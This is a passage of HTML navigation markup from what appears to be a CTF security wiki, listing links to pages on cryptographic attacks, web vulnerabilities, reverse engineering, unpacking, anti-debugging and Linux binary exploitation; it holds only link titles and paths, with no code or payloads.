    <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack-zh/" class="md-nav__link">
      Public Key Index Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack-zh/" class="md-nav__link">
      Private Key d Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/" class="md-nav__link">
      Coppersmith Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/" class="md-nav__link">
      Chosen Plain Cipher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel-zh/" class="md-nav__link">
      Side Channel Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack-zh/" class="md-nav__link">
      Bleichenbacher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_complex-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/knapsack/knapsack-zh/" class="md-nav__link">
      Knapsack Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-4" type="checkbox" id="nav-3-6-4">
    
    <label class="md-nav__link" for="nav-3-6-4">
      Discrete Log Correlation
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Discrete Log Correlation" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-4">
        <span class="md-nav__icon md-icon"></span>
        Discrete Log Correlation
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/discrete-log-zh/" class="md-nav__link">
      Discrete Logarithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/elgamal-zh/" class="md-nav__link">
      Elgamal
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/ecc-zh/" class="md-nav__link">
      ECC
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-5" type="checkbox" id="nav-3-6-5">
    
    <label class="md-nav__link" for="nav-3-6-5">
      Lattice-based Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Lattice-based Cryptography" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-5">
        <span class="md-nav__icon md-icon"></span>
        Lattice-based Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/overview-zh/" class="md-nav__link">
      Lattice Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/introduction-zh/" class="md-nav__link">
      Introduction to Lattices
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/lattice-reduction-zh/" class="md-nav__link">
      Lattice-based Algorithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/cvp-zh/" class="md-nav__link">
      CVP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
    
    <label class="md-nav__link" for="nav-3-7">
      Hash Function
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Hash Function" data-md-level="2">
      <label class="md-nav__title" for="nav-3-7">
        <span class="md-nav__icon md-icon"></span>
        Hash Function
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/introduction-zh/" class="md-nav__link">
      Introduction to the Hash Function
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/md5-zh/" class="md-nav__link">
      MD5
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/sha1-zh/" class="md-nav__link">
      SHA1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/fnv-zh/" class="md-nav__link">
      FNV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/attack-zh/" class="md-nav__link">
      Hash Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/complex-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-8" type="checkbox" id="nav-3-8">
    
    <label class="md-nav__link" for="nav-3-8">
      Digital Signature
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Digital Signature" data-md-level="2">
      <label class="md-nav__title" for="nav-3-8">
        <span class="md-nav__icon md-icon"></span>
        Digital Signature
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/introduction-zh/" class="md-nav__link">
      Introduction to Digital Signatures
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/rsa-zh/" class="md-nav__link">
      RSA Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/elgamal-zh/" class="md-nav__link">
      ElGamal Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/dsa-zh/" class="md-nav__link">
      DSA Digital Signature
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-9" type="checkbox" id="nav-3-9">
    
    <label class="md-nav__link" for="nav-3-9">
      Summary of Attack Techniques
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Summary of Attack Techniques" data-md-level="2">
      <label class="md-nav__title" for="nav-3-9">
        <span class="md-nav__icon md-icon"></span>
        Summary of Attack Techniques
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/attack-mode-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/meet-in-the-middle-zh/" class="md-nav__link">
      Intermediate Encounter Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/bit-attack-zh/" class="md-nav__link">
      Bit attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/certificate/introduction-zh/" class="md-nav__link">
      Certificate Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Web
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Web" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        <span class="md-nav__icon md-icon"></span>
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/introduction-zh/" class="md-nav__link">
      Introduction to Web Applications
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/sqli-zh/" class="md-nav__link">
      SQL Injection
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/xss-zh/" class="md-nav__link">
      XSS Cross-site Scripting Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/csrf-zh/" class="md-nav__link">
      CSRF Cross-site Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/ssrf-zh/" class="md-nav__link">
      SSRF Server Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/php/php-zh/" class="md-nav__link">
      PHP Code Auditing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Assembly
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Assembly" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        <span class="md-nav__icon md-icon"></span>
        Assembly
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/x86-x64/readme-zh/" class="md-nav__link">
      x86_x64
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/mips/readme-zh/" class="md-nav__link">
      mips
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/arm/readme-zh/" class="md-nav__link">
      arm
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Executable
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Executable" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        <span class="md-nav__icon md-icon"></span>
        Executable
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
    
    <label class="md-nav__link" for="nav-6-1">
      ELF file
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ELF file" data-md-level="2">
      <label class="md-nav__title" for="nav-6-1">
        <span class="md-nav__icon md-icon"></span>
        ELF file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/elf-structure-zh/" class="md-nav__link">
      ELF File Basic Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-loading-zh/" class="md-nav__link">
      Program Loading
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-linking-zh/" class="md-nav__link">
      Program Link
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/running-overview-zh/" class="md-nav__link">
      Program Execution Flow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">
    
    <label class="md-nav__link" for="nav-6-2">
      PE file
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="PE file" data-md-level="2">
      <label class="md-nav__title" for="nav-6-2">
        <span class="md-nav__icon md-icon"></span>
        PE file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-excutable-zh/" class="md-nav__link">
      PE File Basic Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-import-table-zh/" class="md-nav__link">
      PE Import Table
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-export-table-zh/" class="md-nav__link">
      PE Export Table
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-relocation-table-zh/" class="md-nav__link">
      PE Relocation Table
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      Reverse Engineering
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Reverse Engineering" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        <span class="md-nav__icon md-icon"></span>
        Reverse Engineering
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
    
    <label class="md-nav__link" for="nav-7-1">
      Reverse Overview
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Reverse Overview" data-md-level="2">
      <label class="md-nav__title" for="nav-7-1">
        <span class="md-nav__icon md-icon"></span>
        Reverse Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/introduction-zh/" class="md-nav__link">
      Software Reverse Engineering Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/Identify-Encode-Encryption/introduction-zh/" class="md-nav__link">
      Common Encryption Algorithms and Code Recognition
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/maze/maze-zh/" class="md-nav__link">
      Labyrinth Problem
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/vm/vm-zh/" class="md-nav__link">
      Virtual Machine Command Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/unicorn/introduction-zh/" class="md-nav__link">
      Unicorn Engine Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-2" type="checkbox" id="nav-7-2">
    
    <label class="md-nav__link" for="nav-7-2">
      Linux Reverse
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Reverse" data-md-level="2">
      <label class="md-nav__title" for="nav-7-2">
        <span class="md-nav__icon md-icon"></span>
        Linux Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-2-1" type="checkbox" id="nav-7-2-1">
    
    <label class="md-nav__link" for="nav-7-2-1">
      Linux Reverse Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Reverse Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-2-1">
        <span class="md-nav__icon md-icon"></span>
        Linux Reverse Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/ld_preload-zh/" class="md-nav__link">
      LD_PRELOAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/false-disasm-zh/" class="md-nav__link">
      Incorrect Disassembly Fix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-bp-zh/" class="md-nav__link">
      Detecting Breakpoints Bypassing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-dbg-zh/" class="md-nav__link">
      Detecting Debugging Bypassing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
    
    <label class="md-nav__link" for="nav-7-3">
      Windows Reverse
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Windows Reverse" data-md-level="2">
      <label class="md-nav__title" for="nav-7-3">
        <span class="md-nav__icon md-icon"></span>
        Windows Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3-1" type="checkbox" id="nav-7-3-1">
    
    <label class="md-nav__link" for="nav-7-3-1">
      Shelling Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Shelling Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-1">
        <span class="md-nav__icon md-icon"></span>
        Shelling Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/packer-introduction-zh/" class="md-nav__link">
      Introduction to the Protective case
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/trace-zh/" class="md-nav__link">
      Single Step Tracking Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/esp-zh/" class="md-nav__link">
      ESP Law
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/direct-oep-zh/" class="md-nav__link">
      One Step to the OEP Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/memory-zh/" class="md-nav__link">
      Memory Mirroring Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/last-exception-zh/" class="md-nav__link">
      Last Exception Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/sfx-zh/" class="md-nav__link">
      SFX Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/fix-iat-zh/" class="md-nav__link">
      DUMP and IAT Reconstruction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/manually-fix-iat-zh/" class="md-nav__link">
      Manually Find the IAT and Rebuild It Using ImportREC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/unpack-dll-zh/" class="md-nav__link">
      DLL File Unpacking
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3-2" type="checkbox" id="nav-7-3-2">
    
    <label class="md-nav__link" for="nav-7-3-2">
      Anti-debugging Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Anti-debugging Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-2">
        <span class="md-nav__icon md-icon"></span>
        Anti-debugging Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntglobalflag-zh/" class="md-nav__link">
      NtGlobalFlag
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/heap-flags-zh/" class="md-nav__link">
      Heap Flags
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/the-heap-zh/" class="md-nav__link">
      The Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/int-3-zh/" class="md-nav__link">
      Interrupt 3
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/isdebuggerpresent-zh/" class="md-nav__link">
      IsDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/checkremotedebuggerpresent-zh/" class="md-nav__link">
      CheckRemoteDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntqueryinformationprocess-zh/" class="md-nav__link">
      NtQueryInformationProcess
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/zwsetinformationthread-zh/" class="md-nav__link">
      ZwSetInformationThread
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/junk-code-zh/" class="md-nav__link">
      Flower command
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/example-zh/" class="md-nav__link">
      Anti-debug technical example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
    
    <label class="md-nav__link" for="nav-8">
      Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        <span class="md-nav__icon md-icon"></span>
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-1" type="checkbox" id="nav-8-1">
    
    <label class="md-nav__link" for="nav-8-1">
      Pwn Overview
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn Overview" data-md-level="2">
      <label class="md-nav__title" for="nav-8-1">
        <span class="md-nav__icon md-icon"></span>
        Pwn Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../readme-zh/" class="md-nav__link">
      Readme zh
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2" type="checkbox" id="nav-8-2">
    
    <label class="md-nav__link" for="nav-8-2">
      Linux Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Pwn" data-md-level="2">
      <label class="md-nav__title" for="nav-8-2">
        <span class="md-nav__icon md-icon"></span>
        Linux Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-1" type="checkbox" id="nav-8-2-1">
    
    <label class="md-nav__link" for="nav-8-2-1">
      Security Protection Mechanism
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Security Protection Mechanism" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-1">
        <span class="md-nav__icon md-icon"></span>
        Security Protection Mechanism
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../mitigation/canary-zh/" class="md-nav__link">
      Canary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-2" type="checkbox" id="nav-8-2-2">
    
    <label class="md-nav__link" for="nav-8-2-2">
      Stack Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stack Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-2">
        <span class="md-nav__icon md-icon"></span>
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stack-intro-zh/" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stackoverflow-basic-zh/" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/basic-rop-zh/" class="md-nav__link">
      Basic ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/medium-rop-zh/" class="md-nav__link">
      Intermediate ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/advanced-rop-zh/" class="md-nav__link">
      Advanced ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/fancy-rop-zh/" class="md-nav__link">
      ROP Tricks
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-3" type="checkbox" id="nav-8-2-3">
    
    <label class="md-nav__link" for="nav-8-2-3">
      Format String Vulnerability
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Format String Vulnerability" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-3">
        <span class="md-nav__icon md-icon"></span>
        Format String Vulnerability
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../fmtstr_intro-zh/" class="md-nav__link">
      Format String Vulnerability Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../fmtstr_exploit-zh/" class="md-nav__link">
      Format String Exploit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../fmtstr_example-zh/" class="md-nav__link">
      Format String Vulnerability Example
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../fmtstr_detect-zh/" class="md-nav__link">
      Format String Vulnerability Detection
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-4" type="checkbox" id="nav-8-2-4">
    
    <label class="md-nav__link" for="nav-8-2-4">
      Glibc Heap Related
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Glibc Heap Related" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-4">
        <span class="md-nav__icon md-icon"></span>
        Glibc Heap Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/introduction-zh/" class="md-nav__link">
      Introduction to Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/heap_overview-zh/" class="md-nav__link">
      Heap Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/heap_structure-zh/" class="md-nav__link">
      Heap Related Data Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-4-4" type="checkbox" id="nav-8-2-4-4">
    
    <label class="md-nav__link" for="nav-8-2-4-4">
      In-depth Understanding of Ptmalloc2
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="In-depth Understanding of Ptmalloc2" data-md-level="4">
      <label class="md-nav__title" for="nav-8-2-4-4">
        <span class="md-nav__icon md-icon"></span>
        In-depth Understanding of Ptmalloc2
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/overview-zh/" class="md-nav__link">
      Implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/basic-zh/" class="md-nav__link">
      Basic Functions in the heap implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/heap-init-zh/" class="md-nav__link">
      Heap Initialization
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/malloc-zh/" class="md-nav__link">
      Allocate Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/free-zh/" class="md-nav__link">
      Free Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/tcache-zh/" class="md-nav__link">
      Tcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/malloc_state-zh/" class="md-nav__link">
      malloc_state
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/misc-zh/" class="md-nav__link">
      Other
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/heapoverflow_basic-zh/" class="md-nav__link">
      Heap Overflow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/off_by_one-zh/" class="md-nav__link">
      Heap-based Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/chunk_extend_overlapping-zh/" class="md-nav__link">
      Chunk Extend/Overlapping
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/unlink-zh/" class="md-nav__link">
